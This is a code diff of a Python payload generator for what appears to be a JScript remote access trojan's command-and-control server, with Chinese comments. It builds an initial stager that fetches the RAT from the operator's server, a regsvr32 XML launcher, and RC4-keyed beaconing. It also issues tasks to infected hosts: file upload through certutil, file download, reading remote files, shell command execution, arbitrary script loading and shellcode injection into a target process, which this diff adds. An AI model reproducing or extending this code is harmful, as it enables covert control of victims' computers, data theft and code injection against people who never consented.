@@ -1,7 +1,10 @@
 #!/usr/bin/env python3
 # coding:utf-8
 from base64 import b64decode, b64encode
+from binascii import unhexlify
+import os
 from .color import BOLD
+from .log import Log
 
 
 def load_template_js(template_name):
@@ -24,50 +27,65 @@ def encode_certutil_base64(data):
     return '{}{}{}'.format('-----BEGIN CERTIFICATE-----|', '|'.join(alldata), '|-----END CERTIFICATE-----')
 
 
+def var_process(context, args):
+    for k, v in args.items():
+        context = context.replace(k, str(v))
+
+    return context
+
+
 class Payload():
     def __init__(self):
         pass
 
     @classmethod
-    def init(cls, server_addr,server_port):
+    def init(cls, server_addr, server_port):
         context = load_template_js('template/init.js')
-        context = context.replace(
-            '~URL_RAT~', 'http://{}:{}/rat'.format(server_addr, server_port))
+        context = var_process(
+            context, {'~URL_RAT~': 'http://{}:{}/rat'.format(server_addr, server_port)})
 
         return context.encode()
 
     @classmethod
-    def rat(cls, server_addr,server_port, rc4_key, sleep_time):
+    def rat(cls, server_addr, server_port, rc4_key, sleep_time):
         context = load_template_js('template/rat.js')
-        context = context.replace(
-            '~URL_RUN~', 'http://{}:{}'.format(server_addr, server_port))
-        context = context.replace('~KEY~', rc4_key)
-        context = context.replace('~SLEEP~', str(sleep_time))
+        js_vars = {'~URL_RUN~': 'http://{}:{}'.format(
+            server_addr, server_port), '~KEY~': rc4_key, '~SLEEP~': str(sleep_time)}
+        context = var_process(context, js_vars)
 
         return context.encode()
 
     @classmethod
-    def regsvr(cls, server_addr,server_port):
+    def regsvr(cls, server_addr, server_port):
         init_js = cls.init(server_addr, server_port).decode()
         context = load_template_js('template/regsvr.xml')
-        context = context.replace('~JS_RAT~', init_js)
+        context = var_process(
+            context, {'~URL_RAT~': init_js})
 
         return context.encode()
+
     '''
-    文件上传
-    读取文件并编码为certutil的base64格式，上传到临时文件后，由certutil解码写入
+    对shellcode进行base64编码处理
+    Forked from Koaidc shellcode_dotnet2js.py
     '''
 
-    def __js_upload(self, kwargs):
-        try:
-            with open(kwargs['local_pathname'], 'rb') as f:
-                data = encode_certutil_base64(bytes(f.read()))
-        except Exception as e:
-            print('upload Exception:{}'.format(str(e)))
-            return ''
-        self.context = self.context.replace(
-            '~PATH_FILE~', kwargs['remote_pathname'].replace('\\', '\\\\'))
-        self.context = self.context.replace('~UPLOAD_DATA~', data)
+    def __shellcode_b64(self, path):
+        if os.path.isfile(path):
+            with open(path, 'rb') as fileobj:
+                text = b64encode(fileobj.read()).decode()
+        else:
+            text = path
+
+        index = 0
+        ret = '"'
+        for c in text:
+            ret += str(c)
+            index += 1
+            if index % 100 == 0:
+                ret += '"+\r\n"'
+
+        ret += '"'
+        return ret
 
     '''
     获取任务执行的payload
@@ -76,29 +94,50 @@ class Payload():
     def get_payload(self, payload_type, job_id, kwargs):
         # 读取模板文件，替换JOBID
         self.context = load_template_js('template/{}.js'.format(payload_type))
-        self.context = self.context.replace('~JOB_ID~', str(job_id))
+        js_vars = {'~JOB_ID~': str(job_id)}
         # 不同的payload的替换和处理
+        # 上传
         if payload_type == 'upload':
-            self.__js_upload(kwargs)
+            with open(kwargs['local_pathname'], 'rb') as f:
+                data = encode_certutil_base64(bytes(f.read()))
+            js_vars['~REMOTE_PATHNAME~'] = kwargs['remote_pathname'].replace(
+                '\\', '\\\\')
+            js_vars['~UPLOAD_DATA~'] = data
+        # 下载
         elif payload_type == 'download':
-            self.context = self.context.replace(
-                '~PATH_FILE~', kwargs['remote_pathname']).replace('\\', '\\\\')
+            js_vars['~REMOTE_PATHNAME~'] = kwargs['remote_pathname'].replace(
+                '\\', '\\\\')
+        # 显示远程文本文件
         elif payload_type == 'cat':
-            self.context = self.context.replace(
-                '~FILE_PATHNAME~', kwargs['file_pathname'])
+            js_vars['~REMOTE_PATHNAME~'] = kwargs['remote_pathname']
+        # 运行程序、执行shell命令
         elif payload_type == 'run' or payload_type == 'shell':
-            self.context = self.context.replace('~CMD~', kwargs['cmd'])
+            js_vars['~CMD~'] = kwargs['cmd']
+        # 设置sleep时间
         elif payload_type == 'sleep':
-            self.context = self.context.replace('~SLEEP~', kwargs['sleep'])
+            js_vars['~SLEEP~'] = kwargs['sleep']
+        # 加载jscript脚本
+        elif payload_type == 'js':
+            with open(kwargs['local_pathname']) as f:
+                js_vars['~JS_SCRIPT~'] = f.read()
+        # shellcode注入
+        elif payload_type == 'inject':
+            js_vars['~PID~'] = kwargs['pid']
+            js_vars['~SC_B64~'] = self.__shellcode_b64(kwargs['shellcode'])
+            js_vars['~DLLCOMMANDS~'] = ''
+            js_vars['~DLLOFFSET~'] = '0'
 
+        # 替换变量
+        self.context = var_process(self.context, js_vars)
         return self.context.encode()
     '''
     获取基本信息任务执行返回时的处理
     '''
 
-    def __job_info(self, response_text):
+    def job_info(self, response_text):
         if len(response_text) <= 0:
             return None
+
         info_array = response_text.split('///')
         if len(info_array) == 7:
             def p(x, y): return print('{}:{}'.format(BOLD(x),  info_array[y]))
@@ -110,30 +149,28 @@ class Payload():
             p('CWD', 5)
             p('IP', 6)
 
+            Log.log_message(response_text, log_type=Log.JOB_RES, output=False)
             return info_array
         else:
-            print(response_text)
+            Log.log_message(response_text, log_type=Log.JOB_RES)
             return None
     '''
     下载任务的返回数据处理：base64解码后写入到文件中
     '''
 
-    def __job_download(self, response_text, args):
-
-        if 'fail' not in response_text:
+    def job_download(self, response_text, args):
+        if 'fail' in response_text:
+            Log.log_message(response_text, log_type=Log.JOB_RES)
+        else:
             data = decode_certutil_base64(response_text)
             try:
                 with open(args['local_pathname'], 'wb') as f:
                     f.write(data)
-                print('[download finish]')
-                return '[download finish]'
+                Log.log_message('[download finish]', log_type=Log.JOB_RES)
             except Exception as ex:
-                raise
-                print('download Exception:{}'.format(str(ex)))
-                return 'download Exception:{}'.format(str(ex))
-        else:
-            print(response_text)
-            return response_text
+                # raise
+                Log.log_message('[download fail:{}]'.format(
+                    ex), log_type=Log.JOB_RES)
 
     '''
     对任务返回数据进行处理
@@ -141,10 +178,8 @@ class Payload():
 
     def payload_callback(self, response_text, job_type, args):
         if job_type == 'info':
-            return self.__job_info(response_text)
+            self.job_info(response_text)
         elif job_type == 'download':
-            return self.__job_download(response_text, args)
+            self.job_download(response_text, args)
         else:
-            print(response_text)
-
-            return response_text
+            Log.log_message(response_text, log_type=Log.JOB_RES)
